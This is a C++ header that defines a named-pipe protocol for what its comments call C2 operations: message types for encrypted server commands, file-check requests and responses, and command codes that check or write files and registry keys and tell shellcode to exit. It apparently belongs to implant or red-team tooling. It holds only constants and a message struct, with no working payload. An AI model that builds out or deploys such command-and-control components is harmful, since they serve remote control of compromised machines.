#ifndef _PIPE_PROTOCOL_HPP
#define _PIPE_PROTOCOL_HPP

#include <stdint.h>

// Pipe message types
#define PIPE_MSG_WAKEUP           0x01  // Wakeup signal (no data)
#define PIPE_MSG_READY            0x02  // Ready signal from com to server
#define PIPE_MSG_COMMAND          0x03  // Encrypted command from server
#define PIPE_MSG_FILE_REQUEST     0x04  // File check request (contains file path)
#define PIPE_MSG_FILE_RESPONSE    0x05  // File check response (contains file content or error)
#define PIPE_MSG_HTTP_RESPONSE    0x06  // Response to send back to server
#define PIPE_MSG_QUIT             0x07  // Quit signal (no data) - tells shellcode to exit

// Command codes for C2 operations
#define CMD_CHECK_FILE      0x00  // Check if file exists and has data
#define CMD_CHECK_REG       0x01  // Check if registry key exists and has data
#define CMD_WRITE_FILE      0x02  // Write data to file
#define CMD_WRITE_REG       0x03  // Write data to registry key
#define CMD_QUIT            0xFF  // Exit shellcode

// Maximum message sizes
#define MAX_PIPE_MESSAGE_SIZE     (64 * 1024)  // 64KB max
#define MAX_FILE_PATH_SIZE        512
#define MAX_FILE_CONTENT_SIZE     (32 * 1024)  // 32KB max
#define MAX_REG_KEY_SIZE          256
#define MAX_REG_VALUE_SIZE        128

// Pipe message header
#pragma pack(push, 1)
typedef struct {
    uint8_t type;          // Message type (PIPE_MSG_*)
    uint32_t size;         // Size of data following header
} pipe_msg_header_t;
#pragma pack(pop)

#endif // _PIPE_PROTOCOL_HPP
